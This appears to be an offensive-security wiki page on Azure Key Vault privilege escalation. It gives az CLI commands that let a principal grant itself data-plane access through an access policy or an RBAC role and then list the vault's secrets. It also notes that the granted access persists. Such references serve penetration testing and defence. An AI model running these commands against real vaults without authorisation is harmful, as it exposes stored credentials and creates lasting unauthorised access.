---
title: "Access policy: granting yourself vault access"
order: 3
description: "Granting yourself vault access by writing a Key Vault access policy or RBAC role to reach its secrets and keys."
keywords:
  - Key Vault
  - access policy
  - RBAC grant
  - vault permissions
  - privilege escalation
---

# Access policy

Reading a vault needs **data-plane** access, but a principal often holds only **management-plane** rights over the vault (Contributor, or a custom role with `Microsoft.KeyVault/vaults/write`). That is enough: you grant your own principal data-plane access, then read everything.

## Granting yourself (access-policy vaults)

```bash
az keyvault set-policy --name <vault> \
  --object-id <your-object-id> \
  --secret-permissions get list --key-permissions get list --certificate-permissions get list
# then dump as normal
az keyvault secret list --vault-name <vault>
```

## Granting yourself (RBAC vaults)

```bash
# newer vaults use Azure RBAC; assign yourself a data-plane role at the vault scope
az role assignment create --assignee <your-object-id> \
  --role "Key Vault Secrets User" \
  --scope /subscriptions/<sub>/resourceGroups/<rg>/providers/Microsoft.KeyVault/vaults/<vault>
```

## Exploitation notes

- This is a management-plane to data-plane privilege escalation; it leaves an access-policy or role-assignment change that stays until noticed, which is also durable access.
- Needing `Microsoft.KeyVault/vaults/write` (set-policy) or `Microsoft.Authorization/roleAssignments/write` (RBAC) makes this an [identity](../../identity/privilege-escalation/index.md) escalation that happens to target a vault.
- On RBAC vaults, `set-policy` has no effect; confirm the vault's permission model first with `az keyvault show --query properties.enableRbacAuthorization`.

## Tools

- **az cli** (`keyvault set-policy`, `role assignment create`).
- **MicroBurst** / **BARK** to spot vaults reachable from a controlled principal.

## References

- [Microsoft: Key Vault RBAC vs access policies](https://learn.microsoft.com/azure/key-vault/general/rbac-guide)
- [HackTricks Cloud: Azure Key Vault privesc](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/index.html)
- [SpecterOps: BARK](https://github.com/BloodHoundAD/BARK)
